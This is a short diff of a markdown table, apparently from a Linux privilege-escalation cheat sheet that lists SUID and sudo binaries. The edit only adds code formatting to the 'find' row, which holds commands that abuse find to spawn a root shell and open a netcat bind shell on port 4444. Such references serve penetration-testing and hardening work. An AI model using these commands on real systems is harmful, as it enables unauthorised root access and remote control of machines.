@@ -39,7 +39,7 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | awk                                |                                                                               |
 | python                             |                                                                               |
 | perl                               |                                                                               |
-| find                               | find /home -exec nc -lvp 4444  -e /bin/bash \;<br>  find /home -exec /bin/bash \; |
+| find                               | `find /home -exec nc -lvp 4444  -e /bin/bash \;<br>  find /home -exec /bin/bash \;` |
 | xxd                                |                                                                               |
 | vi                                 |                                                                               |
 | bash                               |                                                                               |
